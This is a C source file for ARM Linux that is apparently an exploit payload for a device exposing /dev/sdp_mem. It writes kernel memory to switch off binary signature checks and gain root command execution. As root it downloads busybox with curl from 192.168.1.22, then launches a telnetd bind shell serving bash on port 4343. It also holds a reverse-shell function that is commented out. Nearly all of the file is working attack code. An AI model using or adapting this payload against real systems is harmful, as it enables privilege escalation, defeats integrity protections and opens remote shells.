#include <sys/types.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <linux/in.h>
#include <time.h>

#include "syscall_arm.h"

#define SYSCALL_EXIT 0x1
#define SYSCALL_FORK 0x2
#define SYSCALL_READ 0x3
#define SYSCALL_WRITE 0x4
#define SYSCALL_OPEN 0x5
#define SYSCALL_CLOSE 0x5
#define SYSCALL_EXECVE 0xb
#define SYSCALL_DUP2 0x3f
#define SYSCALL_NANOSLEEP 0xa2
#define SYSCALL_MMAP2 0xc0
#define SYSCALL_SOCKET 0x119
#define SYSCALL_CONNECT 0x11b

void exit(int err) {
    __syscall1(SYSCALL_EXIT, err);
}

int fork() {
    return __syscall0(SYSCALL_FORK);
}

void read(int fd, const char *buf, int size) {
    __syscall3(SYSCALL_READ, fd, (long int) buf, size);
}

void write(int fd, const char *buf, int size) {
    __syscall3(SYSCALL_WRITE, fd, (long int) buf, size);
}

int syscall_open(char *filename, int flags, int mode) {
    return __syscall3(SYSCALL_OPEN, (long int) filename, flags, mode);
}

void close(int fd) {
    __syscall1(SYSCALL_CLOSE, fd);
}

void execve(char *filename, char **args, char **envp) {
    __syscall3(SYSCALL_EXECVE, (long int) filename, (long int) args, (long int) envp);
}

int dup2(int oldfd, int newfd) {
    return __syscall2(SYSCALL_DUP2, oldfd, newfd);
}

int nanosleep(const struct timespec *req, struct timespec *rem) {
    return __syscall2(SYSCALL_NANOSLEEP, (long int) req, (long int) rem);
}

void *mmap2(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff) {
    return (void*) __syscall6(SYSCALL_MMAP2, addr, len, prot, flags, fd, pgoff);
}

int socket(int domain, int type, int protocol) {
    return __syscall3(SYSCALL_SOCKET, domain, type, protocol);
}

int connect(int fd, const struct sockaddr *addr, socklen_t addrlen) {
    return __syscall3(SYSCALL_CONNECT, fd, (long int) addr, (long int) addrlen);
}

void *memcpy(void *dst, void *src, size_t size) {
    int i;

    char *d = dst;
    char *s = src;

    for(i=0; i<size; i++) {
        d[i] = s[i];
    }

    return dst;
}

void fork_exec(char **cmd) {
    int pid = fork();

    switch(pid) {
        case 0:
            execve(cmd[0], cmd, 0);
            break;
        default:
            break;
    }
}

void connect_back() {
    int fd = -1;
    struct sockaddr_in addr;
    char *cmd[] = {"/usr/bin/sh", 0};

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1) {
        return;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = 14597;
    addr.sin_addr.s_addr = (37 << 24) | (1 << 16) | (168<<8) | 192;

    if(connect(fd, (struct sockaddr *) &addr, sizeof(addr))) {
        return;
    }

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    execve(cmd[0], cmd, 0);
}

void exec_as_root(char *cmd, int size) {
    int fd_sdp = -1;
    int fd_sdp_version = -1;
    void *ptr = 0;
    char dummy[16];

    fd_sdp = syscall_open("/dev/sdp_mem", O_RDWR, 0);
    if(fd_sdp == -1) {
        return;
    }

    // patch command
    ptr = mmap2(0, 0x1000, 3, 1, fd_sdp, 0x40689);
    memcpy(ptr + 0x25C, cmd, size);

    // launch command by reading sdp version
    fd_sdp_version = syscall_open("/proc/sdp_version", O_RDONLY, 0);
    if(fd_sdp_version == -1) {
        return;
    }

    read(fd_sdp_version, dummy, sizeof(dummy));

    close(fd_sdp);
    close(fd_sdp_version);
}

void payload() {
    int fd_sdp = -1;
    void *ptr = 0;
    struct timespec time_1s = {
        .tv_sec = 1, // wait 1s
        .tv_nsec = 0
    };

    fd_sdp = syscall_open("/dev/sdp_mem", O_RDWR, 0);
    if(fd_sdp == -1) {
        return;
    }

    // patch procfs sdp
    ptr = mmap2(0, 0x1000, 3, 1, fd_sdp, 0x40692);
    *((unsigned int *) (ptr + 0xFF0)) = 0xC0046EDC;

    // deactivate binary signatures
    ptr = mmap2(0, 0x1000, 3, 1, fd_sdp, 0x40691);
    *((unsigned int *) (ptr + 0x428)) = 0;

    close(fd_sdp);

    char cmd_busybox[] = "/usr/bin/curl http://192.168.1.22:5000/static/busybox -o /tmp/busybox\x00";
    exec_as_root(cmd_busybox, sizeof(cmd_busybox));
    nanosleep(&time_1s, 0);

    char cmd_chmod[] = "/usr/bin/chmod +x /tmp/busybox\x00";
    exec_as_root(cmd_chmod, sizeof(cmd_chmod));
    nanosleep(&time_1s, 0);

    char cmd_bindshell[] = "/tmp/busybox telnetd -l /usr/bin/bash -p 4343\x00";
    exec_as_root(cmd_bindshell, sizeof(cmd_bindshell));
    nanosleep(&time_1s, 0);

    // connect_back();
}

int main() {
    int pid = fork();

    switch(pid) {
        case 0:
            payload();
            exit(42);
            break;
        default:
            break;
    }

    return 0;
}
